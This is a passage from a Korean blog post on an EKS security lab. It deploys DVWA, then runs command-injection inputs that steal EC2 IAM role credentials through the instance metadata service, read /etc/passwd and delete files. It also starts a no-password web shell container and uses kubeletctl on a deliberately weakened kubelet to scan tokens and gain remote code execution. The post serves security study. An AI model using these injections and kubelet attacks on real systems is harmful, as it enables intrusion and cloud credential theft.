+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: RECAPTCHA_PUB_KEY
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: SECURITY_LEVEL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: SECURITY_LEVEL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHPIDS_ENABLED
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHPIDS_ENABLED
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHPIDS_VERBOSE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHPIDS_VERBOSE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: PHP_DISPLAY_ERRORS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: PHP_DISPLAY_ERRORS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_HOSTNAME
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              value: dvwa-mysql-service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_DATABASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_DATABASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_USERNAME
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_USERNAME
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
+</span></span><span style="display:flex;"><span>kubectl apply -f dvwa.yaml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ingress 배포</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; dvwa-ingress.yaml
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: networking.k8s.io/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Ingress
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  annotations:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/group.name: study
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/listen-ports: &#39;[{&#34;HTTPS&#34;:443}, {&#34;HTTP&#34;:80}]&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/scheme: internet-facing
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/ssl-redirect: &#34;443&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/success-codes: 200-399
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alb.ingress.kubernetes.io/target-type: ip
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: ingress-dvwa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ingressClassName: alb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  rules:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - host: dvwa.$MyDomain
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    http:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      paths:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      - backend:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          service:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            name: dvwa-web-service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            port:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              number: 80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        path: /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        pathType: Prefix
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
+</span></span><span style="display:flex;"><span>kubectl apply -f dvwa-ingress.yaml
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;DVWA Web https://dvwa.</span>$MyDomain<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><ul>
+<li>웹 접속 admin / password -&gt; DB 구성을 위해 클릭 (재로그인) -&gt; admin / password</li>
+<li>Command Injection 메뉴에서 아래의 명령 실행</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 명령 실행 가능 확인</span>
+</span></span><span style="display:flex;"><span>8.8.8.8 ; echo ; hostname
+</span></span><span style="display:flex;"><span>8.8.8.8 ; echo ; whoami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># IMDSv2 토큰 확인 후 복사</span>
+</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -X PUT <span style="color:#e6db74">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EC2 Instance Profile (IAM Role) 이름 확인</span>
+</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: {IMDSv2 토큰}&#34;</span> –v http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></span><span style="display:flex;"><span>eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># EC2 Instance Profile (IAM Role) 자격증명탈취 성공</span>
+</span></span><span style="display:flex;"><span>8.8.8.8 ; curl -s -H <span style="color:#e6db74">&#34;X-aws-ec2-metadata-token: {IMDSv2 토큰}&#34;</span> –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 그외 다양한 명령 실행 가능</span>
+</span></span><span style="display:flex;"><span>8.8.8.8; cat /etc/passwd
+</span></span><span style="display:flex;"><span>8.8.8.8; rm -rf /tmp/*
+</span></span></code></pre></div><p><img src="./images/dvwa-command-injection-1.png" alt="DVWA Command Injection 1"></p>
+<p><img src="./images/dvwa-command-injection-2.png" alt="DVWA Command Injection 2"></p>
+<p><img src="./images/dvwa-command-injection-3.png" alt="DVWA Command Injection 3"></p>
+<p><img src="./images/get-ec2-iam-role-success-in-dvwa-low-command-injection-with-imdsv2.png" alt="Get EC2 IAM Role success in DVWA Low Command Injection with IMDSv2"></p>
+<h3 id="5-2-실습2-web-openssh-컨테이너">5-2. 실습2: Web OpenSSH 컨테이너</h3>
+<ul>
+<li>HTTPS 동작이라 보안장비가 검출하기 어려움</li>
+<li>다만, 해당 이미지는 alpine 기반에, apk repo를 main에서만 끌어올 수 있게 세팅
+<ul>
+<li>해당 환경에서 kubectl로 취약점 공격할 수가 없어서 curl로 host에 던져보기만 하고 종료</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">## myeks-bastion-2에서 실행</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download docker image</span>
+</span></span><span style="display:flex;"><span>docker pull ghostplant/webshell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 미리 접속할 주소 출력</span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;WebOpenSSH https://</span><span style="color:#66d9ef">$(</span>curl -s ipinfo.io/ip<span style="color:#66d9ef">)</span><span style="color:#e6db74">:8443/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 새로운 쉘(옵션1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [암호X] Run service over HTTPS, no password:</span>
+</span></span><span style="display:flex;"><span>docker run -it --rm --net<span style="color:#f92672">=</span>host -e LISTEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8443 ssl&#34;</span> ghostplant/webshell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 새로운 쉘(옵션2)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [암호O] Run service over HTTPS, with password:</span>
+</span></span><span style="display:flex;"><span>docker run -it --rm --net<span style="color:#f92672">=</span>host -e LISTEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;8443 ssl&#34;</span> -e ACCOUNT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin:badmin&#34;</span> ghostplant/webshell
+</span></span></code></pre></div><ul>
+<li>웹 접속 후, 정보 확인</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 정보 확인</span>
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>ip addr
+</span></span><span style="display:flex;"><span>mount
+</span></span><span style="display:flex;"><span>export
+</span></span><span style="display:flex;"><span>top
+</span></span></code></pre></div><h3 id="5-3-kubelet-미흡한-인증인가-설정-시-위험">5-3. Kubelet 미흡한 인증/인가 설정 시 위험</h3>
+<ul>
+<li>
+<p>두 개의 bastion을 번갈아가며 진행</p>
+</li>
+<li>
+<p>가장 마지막에 둔 이유: 기존 kubeconfig 소실</p>
+<ul>
+<li>실습 종료 후 cloudfomation stack 삭제 시 VPC, EIP를 중심으로 완전 삭제가 되지 않아서 일일히 웹콘솔에서 삭제해야함</li>
+</ul>
+</li>
+<li>
+<p>[my-eks-bastion]</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 노드의 kubelet API 인증과 인가 관련 정보 확인</span>
+</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 cat /etc/kubernetes/kubelet/kubelet-config.json | jq
+</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 cat /var/lib/kubelet/kubeconfig | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 노드의 kubelet 사용 포트 확인 </span>
+</span></span><span style="display:flex;"><span>ssh ec2-user@$N1 sudo ss -tnlp | grep kubelet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 데모를 위해 awscli 파드 생성</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: myawscli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #serviceAccountName: my-sa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 사용</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws sts get-caller-identity --query Arn
+</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws s3 ls
+</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager
+</span></span><span style="display:flex;"><span>kubectl exec -it myawscli -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
+</span></span></code></pre></div><p><img src="images/s3-access-denied-with-default-kubelet-config.png" alt="s3 access denied with default kubelet config"></p>
+<ul>
+<li>[my-eks-bastion-2]</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 기존 kubeconfig 삭제</span>
+</span></span><span style="display:flex;"><span>rm -rf ~/.kube
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 다운로드</span>
+</span></span><span style="display:flex;"><span>curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> chmod a+x ./kubeletctl_linux_amd64 <span style="color:#f92672">&amp;&amp;</span> mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
+</span></span><span style="display:flex;"><span>kubeletctl version
+</span></span><span style="display:flex;"><span>kubeletctl help
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 노드1 IP 변수 지정</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># my-eks-bastion에 저장했던 $N1 확인하여 변수 지정</span>
+</span></span><span style="display:flex;"><span>N1<span style="color:#f92672">=</span>192.168.1.151
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 노드1 IP로 Scan</span>
+</span></span><span style="display:flex;"><span>kubeletctl scan --cidr $N1/32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 노드1에 kubelet API 호출 시도: Unauthorized</span>
+</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/pods; echo
+</span></span></code></pre></div><ul>
+<li>[myeks-bastion] → 노드1 접속 : kubelet-config.json 수정
+<ul>
+<li>authentication.anonymous.enabled: false -&gt; <strong>true</strong></li>
+<li>authorization.mode: &ldquo;Webhook&rdquo; -&gt; <strong>&ldquo;AlwaysAllow&rdquo;</strong></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 노드1 접속</span>
+</span></span><span style="display:flex;"><span>ssh ec2-user@$N1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 미흡한 인증/인가 설정으로 변경: 위의 json 수정내용 참조</span>
+</span></span><span style="display:flex;"><span>vi /etc/kubernetes/kubelet/kubelet-config.json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet restart</span>
+</span></span><span style="display:flex;"><span>systemctl restart kubelet
+</span></span><span style="display:flex;"><span>systemctl status kubelet
+</span></span></code></pre></div><p><img src="images/edit-kubelet-config-with-vulnerability.png" alt="edit kubelet-config with vulnerability"></p>
+<ul>
+<li>[myeks-bastion-2] kubelet 사용</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 파드 목록 확인</span>
+</span></span><span style="display:flex;"><span>curl -s -k https://$N1:10250/pods | jq
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet-config.json 설정 내용 확인</span>
+</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/configz | jq
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubeletct 사용</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Return kubelet&#39;s configuration</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 configz | jq
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get list of pods on the node</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 pods 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scans for nodes with opened kubelet API &gt; Scans for for all the tokens in a given Node</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 scan token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># kubelet API로 명령 실행 : &lt;네임스페이스&gt; / &lt;파드명&gt; / &lt;컨테이너명&gt;</span>
+</span></span><span style="display:flex;"><span>curl -k https://$N1:10250/run/default/myawscli/my-aws-cli -d <span style="color:#e6db74">&#34;cmd=aws --version&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># remote code execution이 가능한 containers 조회</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 scan rce
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run commands inside a container</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span> -n default -p myawscli -c my-aws-cli
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 내부 쉘에서 아래 실행</span>
+</span></span><span style="display:flex;"><span>export
+</span></span><span style="display:flex;"><span>aws --version
+</span></span><span style="display:flex;"><span>aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Return resource usage metrics (such as container CPU, memory usage, etc.)</span>
+</span></span><span style="display:flex;"><span>kubeletctl -s $N1 metrics
+</span></span></code></pre></div><p><img src="images/vulnerable-pods-to-rce.png" alt="vulnerable pods to RCE"></p>
+<h2 id="6-실습-못해본-것">6. 실습 못해본 것</h2>
+<ul>
+<li>파드/컨테이너 보안 컨텍스트
+<ul>
+<li>LB Controller IRSA 덕분에, 나중에 실습해야 함 (To-Do)</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+  </section>
+  <section class="p-strip">
+    <div class="row">
+      <script src="https://giscus.app/client.js"
+        data-repo="kkumtree/blog.minseong.xyz"
+        data-repo-id="R_kgDOIv-sqA"
+        data-category="Blog Comments"
+        data-category-id="DIC_kwDOIv-sqM4CW7uO"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="ko"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+      </script>
+    </div>
+  </section>
+  <section class="p-strip--light">
+    <div class="row">
+      
+      <div class="col-12">
+        <div class="p-media-object">
+          <img src="https://avatars.githubusercontent.com/u/52643858?v=4" class="p-media-object__image is-round" alt="">
+          <div class="p-media-object__details">
+            <h3 class="p-media-object__title">
+              <a href="#">kkumtree</a>
+            </h3>
+            <p class="p-media-object__content">plumber for infra</p>
+            <ul class="p-inline-list--middot">
+              <li class="p-inline-list__item"><a href="mailto:mscho@ubuntu-kr.org">Email</a></li>
+              <li class="p-inline-list__item"><a href="https://launchpad.net/~mscho7969">Launchpad</a></li>
+              <li class="p-inline-list__item"><a href="https://github.com/kkumtree">GitHub</a></li>
+            </ul>
+          </div>
+        </div>
+         
+    </div>
+  </section>
+  <section class="p-strip">
+    <div class="row">
+      <footer class="p-article-pagination">
+        
+        <a class="p-article-pagination__link--previous" href="/post/how-to-backup-gpg-key-to-personal-media/">
+          <span class="p-article-pagination__label">Previous</span>
+          <span class="p-article-pagination__title">GnuPG 키 백업하기</span>
+        </a>
+        
+        
+      </footer>
+    </div>
+  </section>
+</main>
+
+        </div><section class="p-strip--accent">
+  <div class="row">
+    <div class="col-12">
+      <h2>kkumtree</h2>
+      <ul class="p-inline-list--middot is-dark">
+        <li class="p-inline-list__item">
+          <a href="mailto:mscho@ubuntu-kr.org">Contact with (Email)</a>
+        </li>
+        
+        
+        
+        <li class="p-inline-list__item">
+          <a href="https://github.com/kkumtree">GitHub</a>
+        </li>
+        <li class="p-inline-list__item">
+          <a href="https://launchpad.net/~mscho7969">Launchpad</a>
+        </li>
+      </ul>
+      <p></p>
+      <a href="https://github.com/kkumtree/blog.minseong.xyz">Source code on GitHub</a>
+    </div>
+  </div><script type="text/javascript" src='/js/v-framework.js'></script>
+<script type="text/javascript" src='/js/timedisplay.js'></script>
+<script>
+
+let slides = document.getElementsByClassName("main-slide");
+let index = 0;
+let count = slides.length;
+function setSlideIndex(destination) {
+    index = destination % count;
+    index = index < 0 ? index * -1 : index;
+    for (let i = 0; i < count; i++) {
+        if(i == index) {
+            slides[i].style.display = "block";
+        } else {
+            slides[i].style.display = "none";
+        }
+    }
+}
+function nextSlide() {
+    setSlideIndex(index + 1);
+}
+function prevSlide() {
+    setSlideIndex(index - 1);
+}
+setSlideIndex(0);
+setInterval(nextSlide, 5000);
+</script>
+
+</body>
+</html>
